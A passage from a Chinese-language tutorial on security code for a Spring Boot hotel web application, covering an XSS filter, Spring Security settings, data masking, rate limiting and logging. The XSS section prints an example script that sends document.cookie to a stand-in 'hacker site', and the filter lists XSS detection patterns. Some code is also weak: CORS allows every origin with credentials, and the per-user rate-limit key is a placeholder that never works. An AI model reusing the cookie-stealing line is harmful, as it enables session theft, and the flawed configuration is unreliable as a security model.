## 1. XSS攻击防护

### 1.1 什么是XSS攻击？

XSS（Cross-Site Scripting）跨站脚本攻击，是指攻击者在网页中嵌入恶意脚本代码，当其他用户访问时，恶意代码会在用户浏览器中执行。

**攻击示例**：
```html
<!-- 用户在评论框输入这段内容 -->
<script>
    // 偷取用户的cookie信息
    document.location='http://黑客网站/偷?cookie='+document.cookie
</script>

<!-- 如果网站不做防护，其他用户访问时就会执行这段脚本 -->
```

### 1.2 XssFilter - XSS过滤器

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/filter/XssFilter.java`

```java
package com.xunni.hotel.web.filter;

import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;

import java.io.IOException;

/**
 * XSS攻击防护过滤器
 * 
 * 工作原理：
 * 1. 拦截所有HTTP请求
 * 2. 将请求包装成自定义的XssHttpServletRequestWrapper
 * 3. 在Wrapper中对参数进行XSS过滤
 */
@Component
@Order(1)  // 优先级1，最先执行
public class XssFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) 
            throws IOException, ServletException {
        // 将普通请求包装成XSS过滤请求
        XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest) request);
        // 继续执行过滤器链
        chain.doFilter(xssRequest, response);
    }
}
```

**代码解释**：
- `@Component` - Spring注解，将此类交给Spring管理
- `@Order(1)` - 过滤器执行优先级，数字越小越先执行
- `Filter` - Servlet规范中的过滤器接口
- `chain.doFilter(xssRequest, response)` - 将包装后的请求传递给下一个过滤器

### 1.3 XssHttpServletRequestWrapper - 请求包装器

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/filter/XssHttpServletRequestWrapper.java`

```java
package com.xunni.hotel.web.filter;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletRequestWrapper;
import org.apache.commons.lang3.StringEscapeUtils;

import java.util.HashMap;
import java.util.Map;

/**
 * XSS请求包装器
 * 
 * 继承HttpServletRequestWrapper，重写获取参数的方法
 * 对参数进行XSS过滤，防止恶意脚本注入
 */
public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {

    // 构造函数，接收原始请求
    public XssHttpServletRequestWrapper(HttpServletRequest request) {
        super(request);
    }

    // 重写单个参数获取方法
    @Override
    public String getParameter(String name) {
        // 1. 调用原始方法获取参数值
        String value = super.getParameter(name);
        // 2. 对参数进行XSS清理
        return cleanXss(value);
    }

    // 重写多个参数获取方法（如复选框）
    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values == null) {
            return null;
        }
        // 遍历每个值，进行XSS清理
        for (int i = 0; i < values.length; i++) {
            values[i] = cleanXss(values[i]);
        }
        return values;
    }

    // 重写参数Map获取方法
    @Override
    public Map<String, String[]> getParameterMap() {
        Map<String, String[]> map = super.getParameterMap();
        Map<String, String[]> cleanMap = new HashMap<>();
        for (Map.Entry<String, String[]> entry : map.entrySet()) {
            String[] values = entry.getValue();
            for (int i = 0; i < values.length; i++) {
                values[i] = cleanXss(values[i]);
            }
            cleanMap.put(entry.getKey(), values);
        }
        return cleanMap;
    }

    // 重写请求头获取方法
    @Override
    public String getHeader(String name) {
        String value = super.getHeader(name);
        return cleanXss(value);
    }

    /**
     * XSS清理核心方法
     * 
     * @param value 原始输入
     * @return 清理后的安全文本
     */
    private String cleanXss(String value) {
        // 1. 空值检查
        if (value == null) {
            return null;
        }
        
        // 2. HTML转义：将 < > " & 等字符转为HTML实体
        // 例如：<script> 变成 &lt;script&gt;
        value = StringEscapeUtils.escapeHtml4(value);
        
        // 3. 移除script标签及内容
        value = value.replaceAll("<script[^>]*?>.*?</script>", "");
        
        // 4. 移除所有HTML标签
        value = value.replaceAll("<[^>]*>", "");
        
        // 5. 移除javascript:协议
        value = value.replaceAll("javascript:", "");
        
        // 6. 移除事件处理器属性
        value = value.replaceAll("onclick[^=]*=", "");
        value = value.replaceAll("onload[^=]*=", "");
        value = value.replaceAll("onmouseover[^=]*=", "");
        value = value.replaceAll("onerror[^=]*=", "");
        
        // 7. 移除eval函数
        value = value.replaceAll("eval\\((.*)\\)", "");
        
        // 8. 移除javascript伪协议
        value = value.replaceAll("[\\\"\\'][\\s]*javascript:(.*)[\\\"\\']", "\"\"");
        
        return value;
    }
}
```

**代码解释**：
- `HttpServletRequestWrapper` - 装饰器模式，对原始请求进行增强
- `StringEscapeUtils.escapeHtml4()` - Apache Commons Lang工具类，将特殊字符转义
- `replaceAll()` - 正则表达式替换，移除危险内容

**防护效果**：
```
输入: <script>alert('xss')</script>
输出: &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;

输入: <img src=x onerror=alert(1)>
输出: &lt;img src=x &gt;
```

## 2. Spring Security安全配置

### 2.1 SecurityConfig - 安全配置类

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/config/SecurityConfig.java`

```java
package com.xunni.hotel.web.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

import java.util.Arrays;

@Configuration  // 标注为配置类
@EnableWebSecurity  // 启用Spring Security
public class SecurityConfig {

    @Bean  // 将方法返回值交给Spring管理
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
                // ==================== 1. 禁用CSRF ====================
                // CSRF是防止跨站请求伪造的攻击
                // 但使用JWT认证时，Token在请求头中，CSRF风险很低，可以禁用
                .csrf(csrf -> csrf.disable())
                
                // ==================== 2. CORS跨域配置 ====================
                // 允许前端应用跨域访问API
                .cors(cors -> cors
                        .configurationSource(corsConfigurationSource())
                )
                
                // ==================== 3. 安全响应头 ====================
                .headers(headers -> headers
                        // 防止点击劫持：禁止页面被嵌入到iframe中
                        // sameOrigin: 只允许同源网站嵌入
                        .frameOptions(frameOptions -> frameOptions.sameOrigin())
                        
                        // HSTS：强制使用HTTPS访问
                        // maxAgeInSeconds=31536000: 有效期1年
                        // includeSubDomains: 包含子域名
                        .httpStrictTransportSecurity(hsts -> hsts
                                .includeSubDomains(true)
                                .maxAgeInSeconds(31536000)
                        )
                )
                
                // ==================== 4. 会话管理 ====================
                // STATELESS: 无状态会话，不创建HttpSession
                // 因为使用JWT认证，不需要Session存储用户状态
                .sessionManagement(session -> session
                        .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
                )
                
                // ==================== 5. 请求授权 ====================
                .authorizeRequests(auth -> auth
                        // 允许匿名访问的路径
                        .antMatchers("/api/auth/**", "/api/menu/**", "/api/dashboard/**").permitAll()
                        .antMatchers("/health", "/actuator/**").permitAll()
                        // 其他所有请求都需要认证
                        .anyRequest().authenticated()
                )
                
                // ==================== 6. 禁用默认登录方式 ====================
                .formLogin(form -> form.disable())  // 禁用表单登录
                .httpBasic(basic -> basic.disable());  // 禁用HTTP Basic认证
        
        return http.build();
    }

    /**
     * CORS跨域配置
     * 
     * CORS (Cross-Origin Resource Sharing) 跨域资源共享
     * 允许不同源的网页请求本接口
     */
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // 允许的来源，* 表示允许所有（生产环境应限制具体域名）
        configuration.setAllowedOriginPatterns(Arrays.asList("*"));
        
        // 允许的HTTP方法
        configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        
        // 允许的请求头，* 表示全部
        configuration.setAllowedHeaders(Arrays.asList("*"));
        
        // 暴露给前端的响应头（前端可以访问这些响应头）
        configuration.setExposedHeaders(Arrays.asList("Authorization", "Content-Type"));
        
        // 是否允许携带凭证（Cookie）
        configuration.setAllowCredentials(true);
        
        // 预检请求的缓存时间（秒）
        configuration.setMaxAge(3600L);
        
        // 创建配置源并注册到所有路径
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

**关键概念解释**：

| 配置项 | 作用 | 说明 |
|-------|------|------|
| `@Configuration` | 标注配置类 | Spring会扫描此类进行配置 |
| `@EnableWebSecurity` | 启用Security | 激活Spring Security功能 |
| `@Bean` | 注入到容器 | 方法返回值交给Spring管理 |
| `SecurityFilterChain` | 安全过滤器链 | 定义安全过滤规则 |

### 2.2 WebMvcConfig - Web配置类

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/config/WebMvcConfig.java`

```java
package com.xunni.hotel.web.config;

import com.xunni.hotel.web.interceptor.SecurityInterceptor;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

/**
 * WebMvc配置类
 * 
 * 实现WebMvcConfigurer接口，重写方法添加自定义组件
 */
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {

    // 注入安全拦截器
    private final SecurityInterceptor securityInterceptor;

    public WebMvcConfig(SecurityInterceptor securityInterceptor) {
        this.securityInterceptor = securityInterceptor;
    }

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        // 注册安全日志拦截器
        registry.addInterceptor(securityInterceptor)
                // 拦截所有请求
                .addPathPatterns("/**")
                // 排除静态资源和错误页面
                .excludePathPatterns("/static/**", "/error", "/health");
    }
}
```

## 3. 敏感信息脱敏

### 3.1 Sensitive注解 - 脱敏标记

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/annotation/Sensitive.java`

```java
package com.xunni.hotel.web.annotation;

import com.fasterxml.jackson.annotation.JacksonAnnotationsInside;
import com.fasterxml.jackson.databind.annotation.JsonSerialize;
import com.xunni.hotel.web.serializer.SensitiveJsonSerializer;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

/**
 * 敏感字段脱敏注解
 * 
 * 标注在实体类的字段上，返回JSON时会自动脱敏
 */
@Target(ElementType.FIELD)  // 只能标注在字段上
@Retention(RetentionPolicy.RUNTIME)  // 运行时有效
@JacksonAnnotationsInside  // Jackson自定义注解标记
@JsonSerialize(using = SensitiveJsonSerializer.class)  // 指定序列化器
public @interface Sensitive {

    /**
     * 脱敏类型
     * 
     * 每个枚举值对应一种脱敏规则
     */
    SensitiveType type() default SensitiveType.DEFAULT;

    /**
     * 自定义脱敏：保留前缀长度
     */
    int prefix() default 3;

    /**
     * 自定义脱敏：保留后缀长度
     */
    int suffix() default 4;

    /**
     * 脱敏类型枚举
     */
    enum SensitiveType {
        DEFAULT,   // 默认：保留前3后4
        PHONE,     // 手机号：138****8888
        EMAIL,     // 邮箱：1***@qq.com
        ID_CARD,   // 身份证：110****1234
        BANK_CARD, // 银行卡：6222****1234
        NAME,      // 姓名：张**
        ADDRESS,   // 地址：北京市***区
        CUSTOM     // 自定义规则
    }
}
```

**注解解释**：
- `@Target` - 注解的使用位置，`FIELD`表示只能用在属性上
- `@Retention` - 注解保留到什么时候，`RUNTIME`表示运行时有效
- `@JacksonAnnotationsInside` - 让Jackson识别这是一个Jackson注解
- `@JsonSerialize` - 指定JSON序列化时使用的转换器

### 3.2 SensitiveJsonSerializer - 脱敏序列化器

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/serializer/SensitiveJsonSerializer.java`

```java
package com.xunni.hotel.web.serializer;

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.BeanProperty;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.ContextualSerializer;
import com.xunni.hotel.web.annotation.Sensitive;

import java.io.IOException;

/**
 * 敏感字段JSON序列化器
 * 
 * 继承Jackson的JsonSerializer，实现ContextualSerializer接口
 * 可以在序列化前获取字段上的注解信息
 */
public class SensitiveJsonSerializer extends JsonSerializer<String> 
        implements ContextualSerializer {

    // 脱敏类型
    private Sensitive.SensitiveType type;
    // 保留前缀长度
    private int prefix;
    // 保留后缀长度
    private int suffix;

    // 无参构造器（Jackson反序列化需要）
    public SensitiveJsonSerializer() {
    }

    // 带参构造器
    public SensitiveJsonSerializer(Sensitive.SensitiveType type, int prefix, int suffix) {
        this.type = type;
        this.prefix = prefix;
        this.suffix = suffix;
    }

    /**
     * 序列化方法
     * 
     * 将原始字符串转换为脱敏后的字符串
     */
    @Override
    public void serialize(String value, JsonGenerator gen, SerializerProvider serializers) 
            throws IOException {
        if (value == null || value.isEmpty()) {
            gen.writeString(value);
            return;
        }
        
        // 调用脱敏方法
        String maskedValue = maskValue(value, type, prefix, suffix);
        gen.writeString(maskedValue);
    }

    /**
     * 获取字段上的注解信息
     * 
     * 这个方法在序列化前会被调用
     * 从注解中获取脱敏类型和参数
     */
    @Override
    public JsonSerializer<?> createContextual(SerializerProvider prov, BeanProperty property) {
        if (property != null) {
            // 获取字段上的@Sensitive注解
            Sensitive annotation = property.getAnnotation(Sensitive.class);
            if (annotation != null) {
                // 返回配置了注解信息的序列化器
                return new SensitiveJsonSerializer(
                        annotation.type(), 
                        annotation.prefix(), 
                        annotation.suffix()
                );
            }
        }
        return this;
    }

    /**
     * 脱敏核心方法
     * 
     * 根据不同类型执行不同的脱敏规则
     */
    private String maskValue(String value, Sensitive.SensitiveType type, 
                            int prefix, int suffix) {
        if (value == null || value.isEmpty()) {
            return value;
        }

        switch (type) {
            case PHONE:
                // 手机号：138****8888（保留前3后4）
                if (value.length() >= 11) {
                    return value.substring(0, 3) + "****" + value.substring(value.length() - 4);
                }
                break;
            
            case EMAIL:
                // 邮箱：1***@qq.com
                int atIndex = value.indexOf("@");
                if (atIndex > 0) {
                    String username = value.substring(0, atIndex);
                    String domain = value.substring(atIndex);
                    if (username.length() > 1) {
                        return username.charAt(0) + "***" + domain;
                    }
                    return "*" + domain;
                }
                break;
            
            case ID_CARD:
                // 身份证：110**********1234（保留前3后4）
                if (value.length() >= 18) {
                    return value.substring(0, 3) + "**********" + 
                           value.substring(value.length() - 4);
                } else if (value.length() >= 15) {
                    return value.substring(0, 3) + "****" + 
                           value.substring(value.length() - 4);
                }
                break;
            
            case BANK_CARD:
                // 银行卡：6222****1234（保留前4后4）
                if (value.length() >= 16) {
                    return value.substring(0, 4) + "****" + 
                           value.substring(value.length() - 4);
                }
                break;
            
            case NAME:
                // 姓名：张**（只保留姓）
                if (value.length() == 1) {
                    return value;
                } else if (value.length() == 2) {
                    return value.charAt(0) + "*";
                } else {
                    return value.charAt(0) + "**";
                }
            
            case ADDRESS:
                // 地址：北京市***区（保留前4后2）
                if (value.length() > 6) {
                    return value.substring(0, 4) + "***" + 
                           value.substring(value.length() - 2);
                }
                break;
            
            case CUSTOM:
                // 自定义规则
                if (value.length() <= prefix + suffix) {
                    return value;
                }
                return value.substring(0, prefix) + "****" + 
                       value.substring(value.length() - suffix);
            
            case DEFAULT:
            default:
                // 默认规则：保留前3后4
                if (value.length() <= 7) {
                    return value;
                }
                return value.substring(0, 3) + "****" + 
                       value.substring(value.length() - 4);
        }
        
        return value;
    }
}
```

```java
    @Sensitive(type = Sensitive.SensitiveType.EMAIL)
    private String email;

}
```

## 4. 接口限流

### 4.1 RateLimit注解 - 限流标记

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/annotation/RateLimit.java`

```java
package com.xunni.hotel.web.annotation;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

/**
 * 接口限流注解
 * 
 * 标注在Controller方法上，启用接口限流功能
 */
@Target(ElementType.METHOD)  // 只能标注在方法上
@Retention(RetentionPolicy.RUNTIME)
public @interface RateLimit {

    /**
     * 时间窗口（秒）
     * 
     * 在这个时间内统计请求次数
     * 默认60秒
     */
    int window() default 60;

    /**
     * 时间窗口内最大请求数
     * 
     * 超过这个数量会返回429错误
     * 默认100次
     */
    int maxCount() default 100;

    /**
     * 限流类型
     */
    LimitType type() default LimitType.IP;

    /**
     * 限流类型枚举
     */
    enum LimitType {
        IP,   // 按IP地址限流
        USER, // 按用户ID限流
        API   // 按接口限流
    }
}
```

### 4.2 RateLimitAspect - 限流切面

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/aspect/RateLimitAspect.java`

```java
package com.xunni.hotel.web.aspect;

import com.xunni.hotel.common.result.Result;
import com.xunni.hotel.web.annotation.RateLimit;
import jakarta.servlet.http.HttpServletRequest;
import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.reflect.MethodSignature;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Component;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import java.util.concurrent.TimeUnit;

/**
 * 限流切面
 * 
 * AOP切面编程
 * 在标注了@RateLimit的方法执行前进行限流检查
 */
@Aspect  // 标注为切面类
@Component
@Slf4j
public class RateLimitAspect {

    // Redis模板，用于存储限流计数器
    private final RedisTemplate<String, Long> redisTemplate;

    public RateLimitAspect(RedisTemplate<String, Long> redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    /**
     * 环绕通知
     * 
     * 在方法执行前后执行
     * @param joinPoint 连接点（被拦截的方法）
     * @param rateLimit 注解实例
     */
    @Around("@annotation(rateLimit)")
    public Object around(ProceedingJoinPoint joinPoint, RateLimit rateLimit) throws Throwable {
        // 获取限流配置
        int window = rateLimit.window();        // 时间窗口
        int maxCount = rateLimit.maxCount();    // 最大请求数
        RateLimit.LimitType type = rateLimit.type();  // 限流类型
        
        // 生成限流key（根据类型不同生成不同的key）
        String key = generateKey(joinPoint, type);
        
        // 从Redis获取当前请求计数
        Long count = redisTemplate.opsForValue().get(key);
        
        if (count == null) {
            // 第一次请求，设置初始值为1，过期时间为时间窗口
            redisTemplate.opsForValue().set(key, 1L, window, TimeUnit.SECONDS);
        } else if (count >= maxCount) {
            // 超过限流阈值，拒绝请求
            log.warn("[RATE_LIMIT] 请求被拦截 - Key: {}, Window: {}s, Max: {}, Current: {}",
                    key, window, maxCount, count);
            return Result.error(429, "请求过于频繁，请稍后重试");
        } else {
            // 未超过阈值，请求数+1
            redisTemplate.opsForValue().increment(key);
        }
        
        // 继续执行原方法
        return joinPoint.proceed();
    }

    /**
     * 生成限流Key
     * 
     * 根据限流类型生成不同的key
     * 格式：rate_limit:{type}:{value}
     */
    private String generateKey(ProceedingJoinPoint joinPoint, RateLimit.LimitType type) {
        StringBuilder key = new StringBuilder("rate_limit:");
        
        switch (type) {
            case IP:
                // 按IP限流：rate_limit:ip:192.168.1.1
                key.append("ip:").append(getClientIp());
                break;
            case USER:
                // 按用户限流：rate_limit:user:1001
                key.append("user:").append(getCurrentUserId());
                break;
            case API:
                // 按接口限流：rate_limit:api:com.xunni.hotel.UserController.list
                MethodSignature signature = (MethodSignature) joinPoint.getSignature();
                key.append("api:")
                   .append(signature.getDeclaringClass().getName())
                   .append(":")
                   .append(signature.getMethod().getName());
                break;
        }
        
        return key.toString();
    }

    /**
     * 获取客户端IP地址
     */
    private String getClientIp() {
        HttpServletRequest request = getRequest();
        if (request == null) {
            return "unknown";
        }
        
        String ip = request.getHeader("X-Forwarded-For");
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("Proxy-Client-IP");
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getRemoteAddr();
        }
        // 如果是多个代理，取第一个IP
        if (ip != null && ip.contains(",")) {
            ip = ip.split(",")[0].trim();
        }
        return ip;
    }

    /**
     * 获取当前用户ID
     * 
     * 从JWT Token中解析用户ID
     */
    private String getCurrentUserId() {
        HttpServletRequest request = getRequest();
        if (request == null) {
            return "anonymous";
        }
        
        // 从Authorization头获取Token
        String token = request.getHeader("Authorization");
        if (token != null && token.startsWith("Bearer ")) {
            // 实际项目中这里需要调用JWT工具类解析
            // 这里简化处理
            return "user_" + System.currentTimeMillis();
        }
        
        return "anonymous";
    }

    /**
     * 获取当前请求对象
     */
    private HttpServletRequest getRequest() {
        ServletRequestAttributes attributes = 
            (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
        return attributes != null ? attributes.getRequest() : null;
    }
}
```

```java
    // 登录逻辑
```

## 5. 安全日志记录

### 5.1 SecurityInterceptor - 安全拦截器

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/interceptor/SecurityInterceptor.java`

```java
package com.xunni.hotel.web.interceptor;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.HandlerInterceptor;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.UUID;

/**
 * 安全日志拦截器
 * 
 * 继承HandlerInterceptor
 * 在请求处理前后记录日志
 */
@Component
@Slf4j
public class SecurityInterceptor implements HandlerInterceptor {

    // 日期格式化器
    private static final DateTimeFormatter FORMATTER = 
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");

    /**
     * 前置处理
     * 
     * 在Controller方法执行前调用
     * 记录请求开始信息
     */
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, 
                           Object handler) {
        // 生成唯一请求ID（用于追踪）
        String requestId = UUID.randomUUID().toString()
                .replace("-", "").substring(0, 16);
        request.setAttribute("requestId", requestId);
        
        // 获取请求信息
        String ip = getClientIp(request);
        String method = request.getMethod();
        String url = request.getRequestURI();
        String queryString = request.getQueryString();
        
        // 记录请求日志
        log.info("[SECURITY] Request - ID: {}, IP: {}, Method: {}, URL: {}, Query: {}, Time: {}",
                requestId, ip, method, url, queryString, 
                LocalDateTime.now().format(FORMATTER));
        
        return true;  // 返回true继续执行，返回false中断请求
    }

    /**
     * 后置处理
     * 
     * 在Controller方法执行后调用（无论是否异常）
     * 记录请求完成信息和异常
     */
    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, 
                               Object handler, Exception ex) {
        // 获取请求ID
        String requestId = (String) request.getAttribute("requestId");
        
        // 获取响应状态码
        int status = response.getStatus();
        
        if (ex != null) {
            // 有异常，记录错误日志
            log.error("[SECURITY] Request Failed - ID: {}, Status: {}, Error: {}",
                    requestId, status, ex.getMessage(), ex);
        } else {
            // 正常完成
            log.info("[SECURITY] Request Completed - ID: {}, Status: {}, Time: {}",
                    requestId, status, LocalDateTime.now().format(FORMATTER));
        }
    }

    /**
     * 获取客户端真实IP
     * 
     * 支持多层代理的情况
     */
    private String getClientIp(HttpServletRequest request) {
        String ip = request.getHeader("X-Forwarded-For");
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("Proxy-Client-IP");
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("WL-Proxy-Client-IP");
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("HTTP_CLIENT_IP");
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getHeader("HTTP_X_FORWARDED_FOR");
        }
        if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
            ip = request.getRemoteAddr();
        }
        // 如果是多个代理，取第一个IP
        if (ip != null && ip.contains(",")) {
            ip = ip.split(",")[0].trim();
        }
        return ip;
    }
}
```

**拦截器执行流程**：
```
请求进入
    ↓
preHandle() ← 记录请求开始日志
    ↓
返回true
    ↓
执行Controller方法
    ↓
afterCompletion() ← 记录请求完成/错误日志
    ↓
响应返回客户端
```

### 6.1 GlobalExceptionHandler - 全局异常处理器

**文件位置**: `hotel-web/src/main/java/com/xunni/hotel/web/config/GlobalExceptionHandler.java`

```java
package com.xunni.hotel.web.config;

import com.xunni.hotel.common.result.Result;
import jakarta.servlet.http.HttpServletRequest;
import lombok.extern.slf4j.Slf4j;
import org.springframework.dao.DataAccessException;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.core.AuthenticationException;
import org.springframework.validation.FieldError;
import org.springframework.web.bind.MethodArgumentNotValidException;
import org.springframework.web.bind.MissingServletRequestParameterException;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.method.annotation.MethodArgumentTypeMismatchException;

import java.sql.SQLException;
import java.util.stream.Collectors;

/**
 * 全局异常处理器
 * 
 * @ControllerAdvice 标注此类为全局异常处理类
 * 所有Controller抛出的异常都会被此类捕获并处理
 */
@ControllerAdvice
@Slf4j
public class GlobalExceptionHandler {

    /**
     * 处理所有未捕获的异常
     * 
     * @param e 异常对象
     * @param request HTTP请求对象
     * @return 统一格式的错误响应
     */
    @ExceptionHandler(Exception.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleException(Exception e, HttpServletRequest request) {
        // 记录异常日志（包含堆栈信息）
        log.error("[SECURITY] 服务器内部错误 - IP: {}, URL: {}, Error: {}", 
                getClientIp(request), request.getRequestURI(), e.getMessage(), e);
        
        // 返回500错误
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body(Result.error(500, "服务器内部错误"));
    }

    /**
     * 处理运行时异常
     */
    @ExceptionHandler(RuntimeException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleRuntimeException(RuntimeException e, 
                                                          HttpServletRequest request) {
        log.error("[SECURITY] 运行时错误 - IP: {}, URL: {}, Error: {}", 
                getClientIp(request), request.getRequestURI(), e.getMessage(), e);
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body(Result.error(500, "运行时错误：" + e.getMessage()));
    }

    /**
     * 处理参数校验异常
     * 
     * 当使用@Valid注解校验参数失败时抛出此异常
     */
    @ExceptionHandler(MethodArgumentNotValidException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleValidationException(
            MethodArgumentNotValidException e, HttpServletRequest request) {
        
        // 提取所有校验错误信息
        String errors = e.getBindingResult().getFieldErrors().stream()
                .map(FieldError::getDefaultMessage)
                .collect(Collectors.joining(", "));
        
        log.warn("[SECURITY] 参数校验失败 - IP: {}, URL: {}, Errors: {}", 
                getClientIp(request), request.getRequestURI(), errors);
        
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .body(Result.error(400, "参数校验失败：" + errors));
    }

    /**
     * 处理缺少参数异常
     * 
     * 当请求缺少必需参数时抛出此异常
     */
    @ExceptionHandler(MissingServletRequestParameterException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleMissingParameterException(
            MissingServletRequestParameterException e, HttpServletRequest request) {
        
        log.warn("[SECURITY] 缺少必要参数 - IP: {}, URL: {}, Parameter: {}", 
                getClientIp(request), request.getRequestURI(), e.getParameterName());
        
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .body(Result.error(400, "缺少必要参数：" + e.getParameterName()));
    }

    /**
     * 处理参数类型错误异常
     * 
     * 当参数类型不匹配时抛出此异常
     * 例如：int参数传了字符串
     */
    @ExceptionHandler(MethodArgumentTypeMismatchException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleTypeMismatchException(
            MethodArgumentTypeMismatchException e, HttpServletRequest request) {
        
        log.warn("[SECURITY] 参数类型错误 - IP: {}, URL: {}, Error: {}", 
                getClientIp(request), request.getRequestURI(), e.getMessage());
        
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .body(Result.error(400, "参数类型错误：" + e.getName()));
    }

    /**
     * 处理数据库访问异常
     */
    @ExceptionHandler(DataAccessException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleDataAccessException(
            DataAccessException e, HttpServletRequest request) {
        
        log.error("[SECURITY] 数据库访问错误 - IP: {}, URL: {}, Error: {}", 
                getClientIp(request), request.getRequestURI(), e.getMessage(), e);
        
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body(Result.error(500, "数据库访问错误"));
    }

    /**
     * 处理SQL异常
     */
    @ExceptionHandler(SQLException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleSQLException(SQLException e, 
                                                       HttpServletRequest request) {
        log.error("[SECURITY] SQL执行错误 - IP: {}, URL: {}, Error: {}", 
                getClientIp(request), request.getRequestURI(), e.getMessage(), e);
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .body(Result.error(500, "数据库操作失败"));
    }

    /**
     * 处理非法参数异常
     */
    @ExceptionHandler(IllegalArgumentException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleIllegalArgumentException(
            IllegalArgumentException e, HttpServletRequest request) {
        log.warn("[SECURITY] 非法参数 - IP: {}, URL: {}, Error: {}", 
                getClientIp(request), request.getRequestURI(), e.getMessage());
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                .body(Result.error(400, e.getMessage()));
    }

    /**
     * 处理认证异常
     */
    @ExceptionHandler(AuthenticationException.class)
    @ResponseBody
    public ResponseEntity<Result<?>> handleAuthenticationException(
            AuthenticationException e, HttpServletRequest request) {
        log.warn("[SECURITY] 认证失败 - IP: {}, URL: {}, Error: {}", 
                getClientIp(request), request.getRequestURI(), e.getMessage());
